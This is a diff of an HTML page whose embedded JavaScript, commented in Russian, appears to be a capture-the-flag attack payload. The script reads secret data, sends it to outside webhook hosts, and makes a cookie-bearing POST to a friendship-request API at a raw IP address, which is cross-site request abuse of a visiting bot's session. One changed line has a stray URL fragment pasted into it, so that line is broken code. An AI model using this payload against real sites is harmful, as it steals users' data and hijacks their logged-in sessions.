@@ -13,10 +13,10 @@
         .then(response => response.text())
         .then(secretData => {
             // Отправляем флаг на webhook
-            fetch('https://webhook.site/e4c2e3fc-9985-4a2d-b5b2-c06986275334?flag=' + encodeURIComponent(secretData));
+            fetch('https://swift-rabbit-26.webhook.cool?flag=' + encodeURIComponent(secretData));
             
             // И ещё отправляем через friendship request
-            return fetch('http://158.160.184.159:13002/api/friendship/request', {
+            return fetch('http://158.160.184.159:13002/api/friendship/request', {ttps://webhook.site/e4c2e3fc-9985-4a2d-b5b2-c06986275334
                 method: 'POST',
                 credentials: 'include',  // Cookies бота снова автоматически!
                 headers: {
@@ -29,10 +29,10 @@
             });
         })
         .then(() => {
-            fetch('https://webhook.site/e4c2e3fc-9985-4a2d-b5b2-c06986275334?step=2_attack_complete');
+            fetch('https://swift-rabbit-26.webhook.cool?step=2_attack_complete');
         })
         .catch(error => {
-            fetch('https://webhook.site/e4c2e3fc-9985-4a2d-b5b2-c06986275334?error=' + encodeURIComponent(error.toString()));
+            fetch('https://swift-rabbit-26.webhook.cool?error=' + encodeURIComponent(error.toString()));
         });
     </script>
     <p>Loading...  v8</p>
